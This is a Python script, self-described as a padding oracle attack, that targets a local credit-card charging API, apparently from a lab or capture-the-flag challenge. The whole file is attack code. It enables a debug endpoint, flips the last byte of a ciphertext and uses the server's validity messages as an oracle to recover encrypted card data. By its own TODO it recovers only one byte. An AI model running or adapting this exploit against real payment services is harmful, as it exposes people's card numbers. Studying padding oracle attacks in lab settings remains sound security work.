import binascii
import requests
import argparse

BASE_URL = 'http://127.0.0.1:31336/api'

def get_cookie_from_args():
    parser = argparse.ArgumentParser(description="Padding Oracle attack. It probably won't work for you unless it's modified to work with your oracle.")
    parser.add_argument('Cookie',
                        metavar='cookie',
                        type=str,
                        help="ME WANT COOKIE!")
    args = parser.parse_args()
    return args.Cookie

COOKIE = get_cookie_from_args()

class Oracle():

    def __init__(self):
        self.base_url = BASE_URL
        self.session = requests.Session()
        self.headers = {'Cookie':f'capp={COOKIE}'}

    """
    TODO:
    Find rest of plaintext lol

    This currently only finds the last valid byte in the block.
    """
    def xor_iterator(self, input_hash):
        last_byte = input_hash[-2:]
        for i in range(256):
            xored_byte = int(last_byte, base=16) ^ i
            new_hash = input_hash[:-2] + f'{xored_byte:02x}'
            cc_charge_attempt = self.charge_cc(new_hash)
            result = self.get_result(cc_charge_attempt)
            if (result == "Valid Credit Card ciphertext") and (result != input_hash):
                print(f"Found byte! - {hex(i)}")
                return

    def charge_cc(self, cipher_text):
        path = '/chargecc'
        post_body = {
            'CreditCardNumber':cipher_text
            }
        resp = self.make_request(path, post_body)
        raw_req = resp.get('RawReq')
        return raw_req

    def get_result(self, charge_cc_result):
        path = '/raw'
        post_body = {
            "req_type":66,
            "req_b64": charge_cc_result
            }
        resp = self.make_request(path, post_body)
        result = resp.get('description')
        if not result:
            result = "Valid Credit Card ciphertext"
        return result

    def make_request(self, path, post_body):
        url = self.base_url + path
        try:
            r = self.session.post(url, headers=self.headers, json=post_body)
            r.raise_for_status()
        except requests.exceptions.HTTPError as err:
            raise SystemExit(err)
        resp = r.json()
        return resp

    def run(self):
        self.session.get(f'{self.base_url}/enabledebug', headers=self.headers)
        # This is a toy hash for testing. It's probably not even a valid hash. I don't know.
        self.xor_iterator('3f330011b14411d511f7418bc5579ab7d7c193437b9c256b9b10efc6e1df4900')

if __name__ == "__main__":
    oracle = Oracle()
    oracle.run()
